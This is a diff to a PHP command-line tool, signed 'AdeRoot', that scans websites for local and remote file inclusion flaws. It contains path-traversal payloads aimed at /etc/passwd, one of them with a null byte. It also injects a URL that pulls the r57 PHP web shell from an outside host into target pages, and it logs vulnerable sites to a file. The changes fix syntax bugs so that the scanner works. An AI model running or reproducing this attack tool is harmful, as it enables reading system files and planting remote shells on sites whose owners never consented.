@@ -12,14 +12,13 @@ echo "| |   / __|/ __/ _` | '_ \ \n";
 echo "| |___\__ \ (_| (_| | | | |\n";
 echo "|_____|___/\___\__,_|_| |_|\n";
 echo " Coded by AdeRoot v1.0      \n\n";
-
 if($argc == 1) {
 	echo "Help parameter: | -h --help\n";
 	exit(1);
 }
-
 $passwd = array("=../../../../../../../../../../../../etc/passwd",
              "=../../../../../../../../../../../../etc/passwd%00");
+
 $rfi = "http://www.r57shell.net/shell/r57.txt?";
 
 function help() {
@@ -42,10 +41,9 @@ error_reporting(0);
 
 $opts = getopt("hd:l:r:i:");
 foreach(array_keys($opts) as $opt) switch($opt) {
-
-          case "h":
-          help();
-          break;	
+       case "h":
+       help();
+       break;
 
 	  case "d":
 	  $dominio = $opts["d"];
@@ -64,11 +62,11 @@ foreach(array_keys($opts) as $opt) switch($opt) {
 	  $valor = strpos($dominio, "=");
 	  $xpt = substr($dominio, 0, $valor);
 	  foreach($passwd as $passwd1) {
-          $domain = $xpt.$passwd1;
+      $domain = $xpt.$passwd1;
 	  for($i=0; $i <=$tr=count($domain)-1; $i++) {
-	      post($domain);
-	         }
-	     }
+	  post($domain);
+	          }
+	       }
 	   }
 	   break;
 
@@ -83,21 +81,22 @@ foreach(array_keys($opts) as $opt) switch($opt) {
 	  case "i":
 	  $lista = file_get_contents($opts["i"], "r");
 	  $x = array_filter(explode("\n", $lista));
+	  foreach($x as $dominio) {
 	  $valor = strpos($dominio, "=");
-          $xpt = substr($dominio, 0, $valor);
+      $xpt = substr($dominio, 0, $valor);
  	  $domain = $xpt. "=".$rfi;
 	  for($i=0; $i <=$tr=count($domain)-1; $i++) {
-          post($domain);
-                         }
+      post($domain);
                 }
            }
+    }
 
     function post($domain) {
     if(preg_match("@http://@", $domain)){
           $domain = $domain;
-	 } else {
-       domain = "http://".$domain;
-      }
+	   } else {
+         $domain = "http://".$domain;
+    }
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $domain);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
@@ -112,9 +111,9 @@ foreach(array_keys($opts) as $opt) switch($opt) {
     	file_put_contents("lfi-rfi.txt", $domain."\r\n", FILE_APPEND);
     } else {
         echo "Not Found\n\n";
+        }
     }
-  }
-   if(isset($opts["d"]) || ($opts["l"]) || ($opts["r"]) || ($opts["i"])) {
-   	 echo "Fim!\n";
-   }
+     if(isset($opts["d"]) || ($opts["l"]) || ($opts["r"]) || ($opts["i"])) {
+   	        echo "Fim!\n";
+     } 
 ?>
